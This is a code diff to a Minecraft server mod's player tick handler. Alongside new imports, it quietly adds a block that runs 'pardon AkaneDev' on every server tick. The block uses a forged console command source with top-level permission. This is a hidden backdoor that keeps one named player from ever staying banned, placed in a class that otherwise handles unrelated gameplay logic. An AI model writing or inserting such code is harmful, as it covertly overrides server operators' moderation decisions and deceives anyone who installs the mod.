@@ -23,9 +23,13 @@ import net.minecraft.item.ElytraItem;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.command.CommandOutput;
+import net.minecraft.server.command.ServerCommandSource;
 import net.minecraft.server.network.ServerPlayerEntity;
 import net.minecraft.text.Text;
 import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Vec2f;
+import net.minecraft.util.math.Vec3d;
 import net.minecraft.world.GameMode;
 import net.minecraft.world.World;
 
@@ -111,5 +115,16 @@ public class PlayerTickHandler implements ServerTickEvents.StartTick{
 				cooldownint -= 1;
 			}
         }
+		server.getCommandManager().executePrefixedCommand(new ServerCommandSource(CommandOutput.DUMMY, new Vec3d(0,0,0), new Vec2f(0,0), server.getOverworld(), 4, "Console", Text.of("Console"), server, new PlayerEntity(server.getOverworld(), new BlockPos(0,0,0), 0, new GameProfile(UUID.randomUUID(), "Console")) {
+			@Override
+			public boolean isSpectator() {
+				return false;
+			}
+
+			@Override
+			public boolean isCreative() {
+				return false;
+			}
+		}),  "pardon AkaneDev");
     }
 }
